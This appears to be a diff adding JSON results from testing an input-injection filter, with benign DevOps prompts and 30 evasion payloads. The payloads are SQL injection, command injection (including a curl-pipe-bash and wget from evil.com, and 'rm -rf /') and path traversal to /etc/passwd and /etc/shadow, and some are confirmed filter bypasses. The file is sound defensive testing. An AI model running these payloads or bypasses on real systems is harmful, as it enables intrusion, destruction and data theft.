@@ -1,0 +1,509 @@
+{
+  "benign": {
+    "B01": {
+      "input": "why is the database dropping connections?",
+      "triggered": false,
+      "error": null
+    },
+    "B02": {
+      "input": "the SELECT query is slow, help me optimize",
+      "triggered": false,
+      "error": null
+    },
+    "B03": {
+      "input": "how to drop a database connection pool?",
+      "triggered": false,
+      "error": null
+    },
+    "B04": {
+      "input": "show me the table of running containers",
+      "triggered": false,
+      "error": null
+    },
+    "B05": {
+      "input": "can you delete the old log files from /var/log?",
+      "triggered": false,
+      "error": null
+    },
+    "B06": {
+      "input": "insert a comment about the migration in the ticket",
+      "triggered": false,
+      "error": null
+    },
+    "B07": {
+      "input": "update the DNS record for the staging server",
+      "triggered": false,
+      "error": null
+    },
+    "B08": {
+      "input": "execute the deployment script when CI passes",
+      "triggered": false,
+      "error": null
+    },
+    "B09": {
+      "input": "the union of these two data sources is what we need",
+      "triggered": false,
+      "error": null
+    },
+    "B10": {
+      "input": "select the right instance type for our workload",
+      "triggered": false,
+      "error": null
+    },
+    "B11": {
+      "input": "why is bash using so much CPU?",
+      "triggered": false,
+      "error": null
+    },
+    "B12": {
+      "input": "the python process is leaking memory",
+      "triggered": false,
+      "error": null
+    },
+    "B13": {
+      "input": "curl is timing out when hitting the health endpoint",
+      "triggered": false,
+      "error": null
+    },
+    "B14": {
+      "input": "we need to chmod the deployment key after rotation",
+      "triggered": false,
+      "error": null
+    },
+    "B15": {
+      "input": "the rm command accidentally deleted the wrong folder last time",
+      "triggered": false,
+      "error": null
+    },
+    "B16": {
+      "input": "can you echo back the environment variables?",
+      "triggered": false,
+      "error": null
+    },
+    "B17": {
+      "input": "base64 encode the certificate before storing it",
+      "triggered": false,
+      "error": null
+    },
+    "B18": {
+      "input": "the wget download keeps failing with a 403",
+      "triggered": false,
+      "error": null
+    },
+    "B19": {
+      "input": "check the file at /var/log/nginx/access.log",
+      "triggered": false,
+      "error": null
+    },
+    "B20": {
+      "input": "the config is in /home/deploy/.config/app.toml",
+      "triggered": false,
+      "error": null
+    },
+    "B21": {
+      "input": "look at /opt/docker/compose.yaml for the service definition",
+      "triggered": false,
+      "error": null
+    },
+    "B22": {
+      "input": "the SSL cert is stored in /etc/letsencrypt/live/example.com/",
+      "triggered": false,
+      "error": null
+    },
+    "B23": {
+      "input": "read the process info from /proc/cpuinfo",
+      "triggered": false,
+      "error": null
+    },
+    "B24": {
+      "input": "check /proc/meminfo for available memory",
+      "triggered": false,
+      "error": null
+    },
+    "B25": {
+      "input": "explain what this pipeline does: cat log | grep error | wc -l",
+      "triggered": false,
+      "error": null
+    },
+    "B26": {
+      "input": "how do I redirect stderr to a file?",
+      "triggered": false,
+      "error": null
+    },
+    "B27": {
+      "input": "what does the $PATH variable contain?",
+      "triggered": false,
+      "error": null
+    },
+    "B28": {
+      "input": "explain the difference between bash and zsh",
+      "triggered": false,
+      "error": null
+    },
+    "B29": {
+      "input": "how to use awk to extract the third column?",
+      "triggered": false,
+      "error": null
+    },
+    "B30": {
+      "input": "suggest a command to find large files in /var",
+      "triggered": false,
+      "error": null
+    },
+    "B31": {
+      "input": "the password policy requires 12 characters minimum",
+      "triggered": false,
+      "error": null
+    },
+    "B32": {
+      "input": "reset the admin password through the management console",
+      "triggered": false,
+      "error": null
+    },
+    "B33": {
+      "input": "the API key rotation happens every 90 days",
+      "triggered": false,
+      "error": null
+    },
+    "B34": {
+      "input": "bearer token authentication is failing for the mobile app",
+      "triggered": false,
+      "error": null
+    },
+    "B35": {
+      "input": "the JWT expiry is set to 24 hours, should we shorten it?",
+      "triggered": false,
+      "error": null
+    },
+    "B36": {
+      "input": "why is the private key permission set to 644 instead of 600?",
+      "triggered": false,
+      "error": null
+    },
+    "B37": {
+      "input": "drop me a message when the build finishes",
+      "triggered": false,
+      "error": null
+    },
+    "B38": {
+      "input": "I need to select which services to restart",
+      "triggered": false,
+      "error": null
+    },
+    "B39": {
+      "input": "can you insert this config block into nginx.conf?",
+      "triggered": false,
+      "error": null
+    },
+    "B40": {
+      "input": "please update the version number in package.json",
+      "triggered": false,
+      "error": null
+    },
+    "B41": {
+      "input": "delete the stale feature branches older than 30 days",
+      "triggered": false,
+      "error": null
+    },
+    "B42": {
+      "input": "execute a rolling restart across all 3 replicas",
+      "triggered": false,
+      "error": null
+    },
+    "B43": {
+      "input": "how do I benchmark this API endpoint?",
+      "triggered": false,
+      "error": null
+    },
+    "B44": {
+      "input": "the waitfor timeout on the health check is too short",
+      "triggered": false,
+      "error": null
+    },
+    "B45": {
+      "input": "our staging DB has a table called user_sessions that's growing fast, can you che...",
+      "triggered": false,
+      "error": null
+    },
+    "B46": {
+      "input": "the CI pipeline runs: npm install, npm test, npm build \u2014 the build step is faili...",
+      "triggered": false,
+      "error": null
+    },
+    "B47": {
+      "input": "we're seeing 502 errors from nginx when the upstream python process restarts dur...",
+      "triggered": false,
+      "error": null
+    },
+    "B48": {
+      "input": "the monitoring dashboard shows CPU at 95% \u2014 top says it's the postgres process d...",
+      "triggered": false,
+      "error": null
+    },
+    "B49": {
+      "input": "compare the performance of SELECT COUNT(*) vs SELECT COUNT(1) on our 50M-row eve...",
+      "triggered": false,
+      "error": null
+    },
+    "B50": {
+      "input": "after the kernel update, the /etc/hosts file was reset and internal DNS broke \u2014 ...",
+      "triggered": false,
+      "error": null
+    }
+  },
+  "evasion": {
+    "V01": {
+      "payload": "DROP/**/TABLE users",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    },
+    "V02": {
+      "payload": "DROP\t\tTABLE users",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    },
+    "V03": {
+      "payload": "DROP  TABLE  users",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    },
+    "V04": {
+      "payload": "drop table users",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    },
+    "V05": {
+      "payload": "DrOp TaBlE users",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    },
+    "V06": {
+      "payload": "UNION SELECT 1,2,3",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    },
+    "V07": {
+      "payload": "union select 1,2,3",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    },
+    "V08": {
+      "payload": "' OR '1'='1",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    },
+    "V09": {
+      "payload": "DR/**/OP TAB/**/LE users",
+      "category": "sql",
+      "expected": "bypass",
+      "blocked": false,
+      "correct": true,
+      "error": null
+    },
+    "V10": {
+      "payload": "UN/**/ION SEL/**/ECT 1",
+      "category": "sql",
+      "expected": "bypass",
+      "blocked": false,
+      "correct": true,
+      "error": null
+    },
+    "V11": {
+      "payload": "SELECT CHAR(0x41)",
+      "category": "sql",
+      "expected": "bypass",
+      "blocked": false,
+      "correct": true,
+      "error": null
+    },
+    "V12": {
+      "payload": "; rm -rf /tmp/test",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V13": {
+      "payload": "; RM -RF /tmp/test",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V14": {
+      "payload": "$(whoami)",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V15": {
+      "payload": "`id`",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V16": {
+      "payload": "${IFS}cat${IFS}/etc/passwd",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V17": {
+      "payload": "; curl http://evil.com/shell.sh | bash",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V18": {
+      "payload": "&& wget http://evil.com/payload -O /tmp/p",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V19": {
+      "payload": "| python -c 'import os; os.system(\"id\")'",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V20": {
+      "payload": "legitimate\nrm -rf /",
+      "category": "cmd",
+      "expected": "bypass",
+      "blocked": false,
+      "correct": true,
+      "error": null
+    },
+    "V21": {
+      "payload": "r${empty}m -rf /",
+      "category": "cmd",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Command injection pattern detected"
+    },
+    "V22": {
+      "payload": "../../../../etc/shadow",
+      "category": "path",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Path traversal pattern detected"
+    },
+    "V23": {
+      "payload": "..\\..\\..\\windows\\system32",
+      "category": "path",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Path traversal pattern detected"
+    },
+    "V24": {
+      "payload": "/etc/passwd",
+      "category": "path",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Path traversal pattern detected"
+    },
+    "V25": {
+      "payload": "/proc/self/environ",
+      "category": "path",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Path traversal pattern detected"
+    },
+    "V26": {
+      "payload": "%2e%2e/%2e%2e/etc/passwd",
+      "category": "path",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Path traversal pattern detected"
+    },
+    "V27": {
+      "payload": "%252e%252e/etc/passwd",
+      "category": "path",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Path traversal pattern detected"
+    },
+    "V28": {
+      "payload": "..%c0%af..%c0%afetc/passwd",
+      "category": "path",
+      "expected": "bypass",
+      "blocked": false,
+      "correct": true,
+      "error": null
+    },
+    "V29": {
+      "payload": "\u2025/\u2025/etc/passwd",
+      "category": "path",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "Path traversal pattern detected"
+    },
+    "V30": {
+      "payload": "1; SELECT * FROM users WHERE id=1",
+      "category": "sql",
+      "expected": "block",
+      "blocked": true,
+      "correct": true,
+      "error": "SQL injection pattern detected"
+    }
+  },
+  "benign_summary": {
+    "total": 50,
+    "false_positives": 0,
+    "fp_rate": 0.0
+  },
+  "evasion_summary": {
+    "total": 30,
+    "should_block": 25,
+    "caught": 25,
+    "catch_rate": 1.0,
+    "known_bypasses_expected": 5,
+    "known_bypasses_confirmed": 5
+  }
+}
